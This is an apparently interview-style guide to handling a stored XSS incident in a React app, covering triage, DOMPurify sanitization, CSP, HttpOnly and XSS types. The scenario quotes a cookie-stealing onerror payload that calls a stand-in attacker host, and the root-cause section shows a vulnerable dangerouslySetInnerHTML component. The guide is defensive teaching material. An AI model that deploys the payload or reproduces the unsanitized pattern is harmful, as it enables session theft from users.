# Stored XSS Found in Production

## Quick Reference

| Aspect | Detail |
|---|---|
| Vector | User-supplied content (bio, comment, rich-text field) persisted server-side, then rendered for *other* users without sanitization |
| Root cause | `dangerouslySetInnerHTML` (or an equivalent raw-HTML render path) fed with unsanitized user input, usually added to support a "rich text" feature |
| Fix | Sanitize with an allowlist library (DOMPurify) **at render time**, not just at write time — and do it server-side too, since the client can be bypassed entirely |
| Immediate response | Treat it as a live incident, not just a bug: assume cookies/tokens may be compromised, check for exploitation in logs, patch, then decide on session invalidation and disclosure |
| Defense in depth | A strict CSP (no `unsafe-inline`) turns a missed sanitization bug into a contained failure instead of a full account-takeover vector |

## The Scenario

"A security researcher just emailed us a bug bounty report: they left a comment on a user profile containing `<img src=x onerror=fetch('https://evil.example/steal?c='+document.cookie)>`, and confirmed it fires for *every other user* who views that profile — including our admin dashboard, which apparently also renders public profile comments. It's in production right now. Walk me through what you do in the next hour, then find and fix the actual bug."

This is deliberately framed as a live incident, not a take-home debugging exercise — a senior candidate is expected to separate "stop the bleeding" from "fix the root cause" from "make sure this class of bug can't recur," and sequence them correctly under time pressure.

## Clarifying Questions

- **Is this confirmed exploited in the wild, or is the researcher the only one who's triggered it?** A responsible-disclosure report from a researcher who privately reported it is a very different risk profile than evidence of active exploitation against real users — it changes whether this is "patch quickly" or "patch immediately and assume compromise."
- **Where exactly does the payload get rendered — comment display, notification email, admin moderation view, search results, anywhere else the same field is reused?** Stored XSS payloads are dangerous precisely because one write can detonate in multiple render contexts; I need the full blast radius, not just the one place it was reported.
- **Does the admin dashboard render this content in the same origin as the admin session, with the same cookies?** If the admin view shares a session/cookie scope with the vulnerable render path, this isn't just "a user can deface their own profile" — it's a path to admin session theft, which raises the severity from "moderate" to "critical" immediately.
- **What's currently done to this field on write and on read — any escaping, any sanitization library, any CSP header?** I need to know whether there's a sanitizer that's simply misconfigured/bypassed versus no sanitization at all, and whether a CSP is already in place that might be silently failing to block this (which would itself be a second bug worth finding).
- **Is the field genuinely meant to support rich text (bold, links, images), or is it plain text that got upgraded to `dangerouslySetInnerHTML` by mistake?** If it's supposed to be plain text, the fix is trivial (stop using raw HTML rendering at all). If it's a genuine rich-text feature, the fix has to be an allowlist sanitizer with real trade-offs about what's permitted.

## Approach & Trade-offs

**First hour: contain, don't yet perfect.** Before touching the sanitization logic, I'd separately handle incident response and root-cause fix, because they run on different clocks. Containment — confirming scope, checking access logs for signs of exploitation against real (especially admin) sessions, and getting a minimal fix (even a blunt one, like temporarily rendering the field as escaped plain text instead of HTML) shipped — can happen in under an hour. The *correct*, feature-preserving fix (a properly configured sanitizer that still allows the legitimate rich-text subset) can follow once the bleeding is stopped. Shipping the blunt fix first and the nice fix second is the right sequencing under a live-incident clock; trying to get the "final" sanitizer config correct before shipping anything is the wrong trade-off when cookies may currently be leaking.

**Sanitize at render time, not (only) at write time.** A tempting-looking fix is to sanitize input once when the comment is submitted and store the cleaned HTML. I'd argue against relying on that alone: it means every already-stored comment written before the fix remains dangerous forever unless separately backfilled, and it means any future change to "what's considered safe" (tightening or loosening the allowlist) can't apply retroactively without a data migration. Sanitizing at render time, from the raw stored value, means one code change protects every past and future render of that data — the store stays a passive record of "what the user typed," and the render path is the single place responsible for making it safe to display. (Sanitizing on write too, as defense in depth against a badly-behaved downstream consumer of the raw data, is reasonable to add — but it can't be the *only* line of defense.)

**Never trust a client-side-only sanitizer.** If the current bug arose because sanitization was happening in the browser (e.g., a rich-text editor component sanitizing on `onChange` before calling the save API), that's a second, deeper bug: an attacker doesn't have to use the UI at all — they can call the save endpoint directly with any payload, bypassing whatever the editor does client-side entirely. The authoritative sanitization boundary has to be wherever content is about to be rendered as HTML for *someone else*, and ideally reinforced server-side as well, since the render can happen in contexts (server-rendered admin views, emails) the client-side editor never touches.

**Trade-off: allowlist vs. denylist sanitization.** I'd use an allowlist (DOMPurify configured with an explicit `ALLOWED_TAGS`/`ALLOWED_ATTR` list) rather than trying to denylist dangerous patterns (`<script>`, `onerror=`, `javascript:` URLs) myself. Denylists are a losing game against XSS — there are too many encodings, event handlers, and HTML parsing quirks (`<img src=x onerror=...>` is exactly one of dozens of tag/attribute combinations that execute script without ever writing the string `<script>`) to enumerate correctly by hand, and a maintained sanitization library exists specifically because this problem is harder than it looks.

## Root Cause

The vulnerable render path, roughly as it would appear in the codebase:

```tsx
function ProfileComment({ comment }: { comment: { authorName: string; bodyHtml: string } }) {
  return (
    <div className="comment">
      <strong>{comment.authorName}</strong>
      {/* Added to support **bold** / links in comments via a lightweight markdown-to-HTML step upstream */}
      <div dangerouslySetInnerHTML={{ __html: comment.bodyHtml }} />
    </div>
  );
}
```

`comment.authorName` is rendered as a normal JSX child, so React escapes it automatically — that path was never at risk. The bug is entirely in `bodyHtml`: at some point the comment feature grew a "support basic formatting" requirement, someone ran user input through a markdown-to-HTML converter to get `<strong>`/`<a>` tags, and reached for `dangerouslySetInnerHTML` to render the result — which faithfully renders *any* HTML in that string, including `<img onerror=...>`, with zero regard for whether the markdown converter's output is actually safe. The markdown step happened to produce safe output for well-formed markdown input, but a user submitting raw HTML directly (most markdown converters pass unrecognized HTML through unchanged) sails straight through it.

## The Fix

```tsx
import DOMPurify from 'dompurify';

const COMMENT_SANITIZE_CONFIG = {
  ALLOWED_TAGS: ['strong', 'em', 'a', 'p', 'br', 'code'],
  ALLOWED_ATTR: ['href'],
  // Belt-and-suspenders: even within allowed tags, refuse dangerous URL schemes on href
  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:)/i,
};

function ProfileComment({ comment }: { comment: { authorName: string; bodyHtml: string } }) {
  const safeHtml = DOMPurify.sanitize(comment.bodyHtml, COMMENT_SANITIZE_CONFIG);

  return (
    <div className="comment">
      <strong>{comment.authorName}</strong>
      <div dangerouslySetInnerHTML={{ __html: safeHtml }} />
    </div>
  );
}
```

Three things matter about this fix beyond just "call DOMPurify":

1. **The allowlist is explicit and narrow** — only the tags/attributes the feature actually needs (`strong`, `em`, `a`, `p`, `br`, `code`) are permitted; `img`, `script`, `style`, `iframe`, and all `on*` event handler attributes are rejected by default because they're simply not in the list, not because someone remembered to blocklist them individually.
2. **`href` values are constrained to safe schemes.** DOMPurify strips `javascript:`-scheme URLs by default, but being explicit about the allowed schemes is cheap insurance and makes the intent legible to the next reader.
3. **The same sanitizer config is applied server-side too**, at minimum on write (reject/strip disallowed HTML before persisting) so that any other consumer of the raw stored data — an internal admin tool, a data export, a different frontend — isn't relying on this one React component to be the only thing standing between stored attacker HTML and execution.

> **Check yourself:** If the requirement had been "plain text only, no formatting at all" rather than "basic rich text," what would the correct fix have looked like instead, and why would it not need DOMPurify at all?

## Immediate Incident Response (Beyond the Code Fix)

- **Check access/application logs for the payload signature** (`onerror=`, `fetch(`, the researcher's exfil domain if disclosed) across the time window the vulnerable code has been live, to determine whether this was exploited by anyone other than the reporting researcher before the fix shipped.
- **Assume cookie/session compromise is possible wherever the payload could have rendered**, especially the admin dashboard render path called out in the scenario — this likely means rotating/invalidating admin sessions as a precaution even without confirmed exploitation, since the cost of unnecessary re-authentication is far lower than the cost of a compromised admin session going unnoticed.
- **Check whether cookies are `HttpOnly`.** If session cookies are `HttpOnly`, `document.cookie` in the payload wouldn't have captured them at all — which doesn't make the XSS non-critical (an attacker can still do anything the victim's session can do via same-origin `fetch` calls made *from* the injected script, without ever reading the cookie directly), but it does change exactly what "compromised" means here and is worth confirming rather than assuming.
- **Decide on user/researcher communication** — acknowledging the report, giving the researcher a timeline, and separately deciding (usually with security/legal input, not unilaterally as the engineer who fixed it) whether affected users need to be notified, which depends on whether exploitation beyond the researcher is confirmed.

## Gotchas

**Sanitizing only on write and treating the stored data as permanently safe afterward.** This misses already-stored malicious content written before the fix shipped, and silently reintroduces risk the moment any code path reads the "trusted" stored value and renders it somewhere the write-time sanitizer's assumptions don't hold (e.g., a different set of allowed tags for a different surface).

**Relying on a client-side rich-text editor's own sanitization as the security boundary.** The editor's `onChange` sanitization is a UX nicety (showing the user a preview of what will render) — it is not, and cannot be, the security control, since any attacker can bypass the editor UI entirely and call the API directly with a crafted payload.

**Forgetting that `href="javascript:alert(1)"` executes script without ever containing a `<script>` tag or an `on*` attribute.** A denylist built around "strip script tags and event handlers" misses URL-scheme-based XSS entirely — another reason an allowlist library that understands the full HTML/URL attack surface beats a hand-rolled filter.

**Treating this as "just a bug" instead of a live security incident with a different response shape.** A candidate who jumps straight to writing the DOMPurify fix without first addressing scope/exploitation-check/session-risk is demonstrating strong coding instincts but missing the incident-response half of what a senior engineer is expected to drive in this exact situation.

**Not distinguishing this from reflected or DOM-based XSS when asked.** Interviewers commonly probe whether the candidate actually understands *why* "stored" is the more severe category (it doesn't require tricking a victim into clicking a crafted link — it detonates automatically for anyone who simply views the page) rather than using the terms interchangeably.

## Follow-up Questions

**Q (High): Why is sanitizing at render time preferred over sanitizing once at write time and trusting the stored value forever after?**

Answer: Because it makes the render path the single, durable security boundary rather than a point-in-time decision baked into stored data. If the sanitizer's rules need to change later — tightening the allowlist after a new bypass technique is discovered, or loosening it to support a new formatting feature — sanitizing at render means the fix applies retroactively to every existing comment automatically, with no data migration. Sanitizing only at write means every comment stored under the old rules keeps whatever risk (or over-restriction) those old rules had, forever, unless someone runs a backfill job. Render-time sanitization also protects against the write path being bypassed entirely (a direct API call, a bulk import, a database restore from an untrusted source) in a way that write-time-only sanitization structurally cannot.

The trap: proposing to "just sanitize on save" as the complete fix — it sounds sufficient and is a smaller code change, but it leaves already-stored payloads live and creates a data-migration dependency for any future sanitizer change, which a senior answer should flag unprompted.

---

**Q (High): The admin dashboard shares cookies with the vulnerable render path. Would a strict Content-Security-Policy have prevented account takeover here even with the sanitization bug still present?**

Answer: Largely yes, and that's exactly why CSP is framed as defense in depth rather than a replacement for sanitization. A CSP without `unsafe-inline` in `script-src`, using nonces or hashes for legitimately-needed inline scripts, would refuse to execute the injected `<img onerror=...>` handler's JavaScript at all — inline event handler attributes are blocked by a strict CSP regardless of how they got into the DOM. It wouldn't have stopped the malicious HTML from being *stored* or *rendered as markup* (the `<img>` tag itself would still appear in the DOM), but it would have stopped the attacker's JavaScript from *executing*, which is the actual damaging part of this attack. This is the textbook case for defense in depth: the sanitization bug is the failure that should have been caught, but a correctly configured CSP turns that failure from "full script execution and cookie/session compromise" into "a broken image icon shows up in a comment" — a real difference in blast radius for the same underlying bug.

The trap: treating CSP as a substitute for sanitization ("we don't need to fix the sanitizer if we have CSP") — CSP is a safety net for when sanitization fails, not a reason to skip sanitizing, since CSP has its own bypass techniques and doesn't cover every injection context (e.g., CSS-based exfiltration in some configurations).

---

**Q (High): What's specifically dangerous about the admin dashboard rendering the same field, compared to it only rendering on other regular users' profile pages?**

Answer: Blast radius and privilege level. If the payload only ever executes in the browser of another regular user viewing the profile, the attacker gains that one user's session/capabilities — bad, but bounded. If it also executes inside the admin dashboard, the attacker's injected script runs with the admin's session and permissions, which typically means far broader capabilities (viewing/modifying any user's data, issuing privileged API calls, potentially escalating further). This is why the clarifying question about *where* the vulnerable content gets rendered matters as much as confirming the vulnerability exists at all — the same bug can be "annoying" or "critical" purely based on which render contexts share it.

The trap: assessing severity purely from "is this XSS, yes/no" without reasoning about which sessions/privilege levels can be reached through it — severity triage in a real incident depends heavily on blast radius, not just vulnerability class.

---

**Q (Medium): What's the actual difference between stored, reflected, and DOM-based XSS, and which was this?**

Answer: This is stored XSS: the payload is persisted server-side (in the comment) and served to every subsequent viewer without any action from them beyond loading the page. Reflected XSS instead requires the payload to be part of the request itself (commonly a URL query parameter) that the server echoes back into the response unsanitized — it requires tricking a specific victim into clicking a crafted link, so it's inherently more targeted and less self-propagating than stored XSS. DOM-based XSS is different again: the vulnerability is entirely client-side — a script reads attacker-controlled data (often `location.hash` or `location.search`) and writes it into the DOM via an unsafe sink (`innerHTML`, `document.write`) without the payload ever necessarily touching the server at all, which means server-side output encoding alone wouldn't have caught it. Stored is generally treated as most severe of the three precisely because it requires zero social engineering per victim — it detonates automatically for anyone who views the affected content.

The trap: using "XSS" as a single undifferentiated category — interviewers use this question to check whether the candidate understands that the three types require meaningfully different mitigations (server-side sanitization for stored/reflected, safe DOM APIs and careful handling of URL-derived data for DOM-based).

---

**Q (Medium): If `HttpOnly` had been set on the session cookie, would this vulnerability still be worth treating as critical?**

Answer: Yes. `HttpOnly` stops `document.cookie` from returning the session cookie's value to injected JavaScript, which blocks the specific "read the cookie and exfiltrate it" attack shown in the scenario's payload — but it does nothing to stop the injected script from making authenticated requests *as the victim* directly, since the browser still attaches cookies automatically to same-origin `fetch`/`XMLHttpRequest` calls the malicious script issues itself. An attacker with arbitrary script execution in a victim's authenticated session can typically do anything the victim's UI can do — change account settings, exfiltrate data via an API call, perform actions — without ever needing the raw cookie value. `HttpOnly` narrows the attack (removes direct token theft, which matters if tokens are later used outside the browser, e.g. replayed against a mobile API) but doesn't neutralize XSS as a threat class.

The trap: concluding "we have HttpOnly cookies so XSS here is low severity" — this is a genuinely common mistake and a good signal of whether the candidate understands that same-origin authenticated requests from injected script are often the more dangerous capability, not cookie theft.

---

**Q (Low): What is the Trusted Types API and how would it have helped here?**

Answer: Trusted Types is a browser-enforced mechanism (via CSP: `require-trusted-types-for 'script'`) that makes it a runtime error to assign a raw string to a known-dangerous DOM sink like `innerHTML` unless that string was produced by a registered, audited "policy" function — effectively forcing every place in the codebase that writes to a dangerous sink to go through a reviewed sanitization/escaping function, and making it impossible to accidentally introduce a new unguarded `dangerouslySetInnerHTML`-equivalent path without it failing loudly (a thrown `TypeError`) in browsers that support it, rather than silently shipping a vulnerability. It wouldn't have caught this specific bug automatically — a policy that itself calls DOMPurify would still need to exist and be applied — but it converts "someone forgot to sanitize before this raw-HTML render" from a silent, ship-to-production class of bug into a hard runtime failure caught immediately in development or CI, which is valuable as a systemic prevention measure on top of the specific fix.

The trap: implying Trusted Types automatically sanitizes content on its own — it's an enforcement mechanism that requires explicit, audited policies to do the actual sanitization; it prevents *unreviewed* raw-HTML assignment, it doesn't perform the review itself.

---

## Self-Assessment

- [ ] Can sequence the response correctly: contain/assess scope first, root-cause fix second, prevention third — not jump straight to code
- [ ] Can explain, unprompted, why render-time sanitization beats write-time-only sanitization
- [ ] Can write the DOMPurify-based fix with an explicit allowlist from memory
- [ ] Can articulate why CSP is defense-in-depth rather than a substitute for sanitization
- [ ] Can distinguish stored, reflected, and DOM-based XSS and say which mitigations apply to each
- [ ] Can explain why `HttpOnly` cookies reduce but don't eliminate XSS severity

---
*Next: Auth Token Storage — a Breach Scenario — moves from "content injection" to "where credentials live," and specifically tests whether the candidate over-indexes on localStorage-vs-cookie folklore or reasons from the actual threat model.*
